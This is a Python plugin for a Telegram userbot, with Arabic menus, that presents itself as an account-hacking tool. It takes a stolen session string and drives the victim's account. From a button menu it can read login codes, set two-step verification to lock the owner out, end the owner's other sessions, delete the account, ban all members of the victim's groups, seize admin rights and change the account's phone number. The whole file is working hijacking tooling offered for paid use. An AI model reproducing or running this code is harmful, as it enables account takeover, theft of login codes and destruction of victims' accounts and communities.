import os
import asyncio
import re
from os import system
from datetime import timedelta
from telethon import events, functions, types, Button
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon
from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa
from telethon.tl.functions.channels import CreateChannelRequest as ccr

from zira import bot, zedub
from ..Config import Config

bot = borg = tgbot

Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
Zel_Uid = bot.uid
Zed_Vip = (1895219306, 6269975462, 6550930943, 5993018048, 5809896714, 1985225531, 6579579366, 6886550001, 925972505, 6038435721, 5746412340, 1762269116, 6272130846, 1052790413, 6055956182, 5059075331, 6669333713, 6328317500, 5616315677)

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    await X(rt())

GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    try:
      await X.edit_2fa('ZThon')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    await X(join(username))


async def leavegroup(strses, username):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    i = ""
    
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await X.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "ZThon"
menu = '''

A  ➠   ** تحقق من قنوات ومجموعات الحساب **

B  ➠  ** اضهار معلومات الحساب كالرقم والايدي والاسم....الخ**

C  ➠  ** لـحظر جميع اعضاء مجموعة او قنـاة صاحب الحسـاب**

D  ➠  ** تسجيل الدخول الى حساب المستخدم **

E  ➠  ** اشتراك بمجموعة او قناة معينة** 

F  ➠  ** مغادرة مجموعة او قناة معينة** 

G  ➠  ** حذف قناة او مجموعة **

H  ➠  ** التحقق اذا كان التحقق بخطوتين مفعل ام لا **

I   ➠  ** تسجيل الخروج من جميع الجلسات عدا جلسة البوت **

J  ➠  ** حذف الحساب نهائيا**

K  ➠  ** تنزيل جميع المشرفين من مجموعة معينة او قناة **

L  ➠  ** رفع مشرف لشخص معين في قناة او مجموعة **

M  ➠  ** تغييـر رقـم هـاتف الحسـاب **

'''
mm = '''
**- عليك الانضمـام في قنـاة السـورس اولاً**  @ZThon
'''

keyboard = [
  [  
    Button.inline("A", data="AAA"), 
    Button.inline("B", data="BBB"),
    Button.inline("C", data="CCC"),
    Button.inline("D", data="DDD"),
    Button.inline("E", data="EEE")
    ],
  [
    Button.inline("F", data="FFF"), 
    Button.inline("G", data="GGG"),
    Button.inline("H", data="HHH"),
    Button.inline("I", data="III"),
    Button.inline("J", data="JJJ"),
    ],
  [
    Button.inline("K", data="KKK"), 
    Button.inline("L", data="LLL"),
    Button.inline("M", data="MMM"),
    ],
  [
    Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/ZThon")
    ]
]



@zedub.zed_cmd(pattern="هاك$")
async def op(event):
    if Zel_Uid not in Zed_Vip:
        return await edit_or_reply(event, "**⎉╎عـذࢪاً .. ؏ـزيـزي\n⎉╎هـذا الامـر ليـس مجـانـي📵\n⎉╎للاشتـراك في الاوامـر المدفوعـة\n⎉╎تواصـل مطـور السـورس @zzzzl1l\n⎉╎او التواصـل مـع احـد المشرفيـن @AAAl1l**")
    zelzal = Bot_Username.replace("@","")       
    await event.edit(f"**- مرحبـا عـزيـزي\n\n- قم بالدخـول للبـوت المسـاعـد @{zelzal} \n- وارسـال الامـر  /hack**")

@zedub.zed_cmd(pattern="اختراق$")
async def op(event):
    if Zel_Uid not in Zed_Vip:
        return await edit_or_reply(event, "**⎉╎عـذࢪاً .. ؏ـزيـزي\n⎉╎هـذا الامـر ليـس مجـانـي📵\n⎉╎للاشتـراك في الاوامـر المدفوعـة\n⎉╎تواصـل مطـور السـورس @zzzzl1l\n⎉╎او التواصـل مـع احـد المشرفيـن @AAAl1l**")
    zelzal = Bot_Username.replace("@","")       
    await event.edit(f"**- مرحبـا عـزيـزي\n\n- قم بالدخـول للبـوت المسـاعـد @{zelzal} \n- وارسـال الامـر  /hack**")
       
@tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  if Zel_Uid not in Zed_Vip:
      return await edit_or_reply(event, "**⎉╎عـذࢪاً .. ؏ـزيـزي\n⎉╎هـذا الامـر ليـس مجـانـي📵\n⎉╎للاشتـراك في الاوامـر المدفوعـة\n⎉╎تواصـل مطـور السـورس @zzzzl1l\n⎉╎او التواصـل مـع احـد المشرفيـن @AAAl1l**")
  if event.sender_id == bot.uid:
      async with bot.conversation(event.chat_id) as x:
        keyboard = [
          [  
            Button.inline("A", data="AAA"), 
            Button.inline("B", data="BBB"),
            Button.inline("C", data="CCC"),
            Button.inline("D", data="DDD"),
            Button.inline("E", data="EEE")
            ],
          [
            Button.inline("F", data="FFF"), 
            Button.inline("G", data="GGG"),
            Button.inline("H", data="HHH"),
            Button.inline("I", data="III"),
            Button.inline("J", data="JJJ")
            ],
          [
            Button.inline("K", data="KKK"), 
            Button.inline("L", data="LLL"),
            Button.inline("M", data="MMM"),
            ],
          [
            Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/ZThon")
            ]
        ]
        await x.send_message(f"**- مرحبـاً بـك عـزيـزي\n- اليـك قائمـة اوامـر اختـراق الحسـاب عبـر كـود سيشـن تيرمكـس\n- اضغـط احـد الازرار للبـدء** \n\n{menu}", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"AAA")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**\n /hack", buttons=keyboard)
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**\n/hack", buttons=keyboard)
      if len(i) > 1:
        file = open("session.txt", "w")
        file.write(i + "\n\n**- بواسطـة زدثــون @ZThon**")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️** \n/hack", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"BBB")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**\n/hack", buttons=keyboard)
    i = await userinfo(strses.text)
    await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️**\n/hack", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"CCC")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
    await x.send_message("**- حسنـاً .. ارسـل معـرف/ايـدي المجموعـة او القنـاة الآن**")
    grpid = await x.get_response()
    await userbans(strses.text, grpid.text)
    await event.reply("**- جـارِ ... حظـر جميـع اعضـاء المجموعـة/القنـاة**", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"DDD")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️**", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"EEE")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
    await x.send_message("**- حسنـاً .. ارسـل معـرف/ايـدي المجموعـة او القنـاة الآن**")
    grpid = await x.get_response()
    await joingroup(strses.text, grpid.text)
    await event.reply("تم الانضمام الى القناة او الكروب", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"FFF")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
    await x.send_message("**- حسنـاً .. ارسـل معـرف/ايـدي المجموعـة او القنـاة الآن**")
    grpid = await x.get_response()
    await leavegroup(strses.text, grpid.text)
    await event.reply("لقد تم مغادرة القناة او الكروب,", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"GGG")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
      await x.send_message("**- حسنـاً .. ارسـل معـرف/ايـدي المجموعـة او القنـاة الآن**")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك زدثــون.", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"HHH")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
      i = await user2fa(strses.text)
      if i:
        await event.reply("**- صاحب الحسـاب لم يفعـل التحقق بخطـوتين\n- يمكنك الدخول الى الحساب بكل سهوله عبـر الامـر ( D )\n\n- شكـراً لـ استخدامـك زدثــون**", buttons=keyboard)
      else:
        await event.reply("**- عـذراً .. صاحب الحسـاب مفعـل التحقق بخطـوتين**", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"III")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
      i = await terminate(strses.text)
      await event.reply("**- لقد تم انهـاء جميـع الجلسـات .. بنجـاح \n- شكـراً لـ استخدامـك ســورس زدثــون**", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"JJJ")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
      i = await delacc(strses.text)
      await event.reply("**- تم حـذف الحسـاب .. بنجـاح \n- شكـراً لـ استخدامـك ســورس زدثــون**", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"KKK")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
      await x.send_message("**- حسنـاً .. ارسـل معـرف المجموعـة او القنـاة الآن**")
      grp = await x.get_response()
      await x.send_message("**- حسنـاً .. ارسـل المعـرف الآن**")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("**- جـارِ رفعـك مشـرفاً في المجمـوعـة/القنـاة**", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"LLL")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
      await x.send_message("**- حسنـاً .. ارسـل معـرف المجموعـة او القنـاة الآن**")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("**- تم تنزيـل مشـرفيـن المجمـوعـة/القنـاة .. بنجـاح \n- شكـراً لـ استخدامـك ســورس زدثــون**", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"MMM")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
      await x.send_message("**- حسنـاً .. ارسـل الرقم الذي تريـد تغييـر الحسـاب اليـه**\n[**ملاحظـه هامـه**]\n**- اذا استخدمت الارقام الوهميه لن تستطيـع الحصـول على الكـود **")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n\n **انسخ كـود رمز الهاتف وتحقق من رقمك الذي حصلت عليهotp**\n**توقف لمدة 20 ثانية ثـم انسخ رمز الهاتف الكـود و otp**")
        await asyncio.sleep(20)
        await x.send_message("**- حسنـاً .. ارسـل كـود الدخـول الآن**")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("**- حسنـاً .. ارسـل كـود التحقق بخطـوتين الآن**")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("**- تم تغييـر الرقـم .. بنجـاح**✅")
        else:
          await event.respond("**هناك شي خطا**")
      except Exception as e:
        await event.respond(f"**- ارسل هذا الخطأ الى @zzzzl1l \n- الخطـأ** str(e)\n")
     
